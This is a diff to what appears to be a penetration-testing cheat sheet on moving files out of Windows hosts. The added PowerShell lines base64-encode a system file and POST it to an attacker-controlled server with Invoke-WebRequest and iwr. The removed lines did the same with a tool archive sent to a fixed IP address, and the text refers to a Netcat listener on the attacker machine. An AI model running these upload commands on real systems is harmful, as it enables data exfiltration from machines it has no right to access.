@@ -327,18 +327,23 @@ Invoke-FileUpload -Uri http://$ipServer:8000/upload -File C:\Windows\System32\dr
 
 ```
 
-#### PowerShell Base64 Web Upload
+
+
+
+
+#### PowerShell Base64 Web Upload: Invoke-WebRequest iwr
 
 Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat.
 
 ```powershell
+# Invoke-WebRequest
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
-
 Invoke-WebRequest -Uri http://$ipServer:8000/ -Method POST -Body $b64
 
+# iwr is an alias of Invoke-WebRequest
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+iwr -uri http://$ipServer:8000/ -Method POST -Body $b64
 
-$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Tools\pingcastle.zip' -Encoding Byte))
-Invoke-WebRequest -Uri http://10.10.14.21:8000/ -Method POST -Body $b64
 ```
 
 From the attacker machine:
